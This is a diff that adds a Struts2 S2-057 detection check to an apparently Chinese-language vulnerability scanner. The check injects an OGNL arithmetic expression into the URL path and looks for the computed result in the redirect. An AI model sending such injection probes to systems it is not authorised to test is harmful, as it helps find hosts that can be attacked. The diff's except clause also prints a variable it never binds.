@@ -217,6 +217,16 @@ class struts_baseverify:
             cprint("检测struts2-053超时..", "cyan")
             print "超时原因: ", e
 
+        try:
+            self.url = self.url.replace("/actionChain1.action", "/${12345%2a54321}/actionChain1.action")
+            req = requests.get(self.url, timeout=6, verify=False, allow_redirects=True)
+            if r"670592745" in req.url:
+                cprint("目标存在struts2-057漏洞..(只提供检测)", "red")
+        except:
+            cprint("检测struts2-057超时..", "cyan")
+            print "超时原因: ", e
+
+
     def inShell(self, pocname):
         cprint('''
  ____  _              _            ____                  
